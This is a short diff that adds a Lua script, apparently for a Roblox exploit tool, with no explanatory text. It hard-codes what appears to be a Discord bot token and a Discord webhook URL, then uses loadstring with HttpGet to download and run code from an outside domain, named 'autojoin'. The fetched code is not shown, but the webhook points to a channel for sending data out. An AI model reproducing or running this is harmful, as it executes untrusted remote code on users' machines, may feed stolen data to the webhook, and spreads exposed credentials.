@@ -1,0 +1,4 @@
+Discord_Token = "MTI1OTg4OTQyOTAxNTk1NzUxNw.GAhavX.IF8NA bdx46KjjOhBQFaXsuoib1jrlaSruCFx6s"
+Webhook = "https://discord.com/api/webhooks/1317026740413009963/kwRdudfZRjfffUWgc-yhwWR8gePeNw0oh3kGRPuJE7ZYGD_pWGjGQ-tNUMs0jcF3OLNX"
+
+loadstring(game:HttpGet("https://egorikusa.space/autojoin"))()
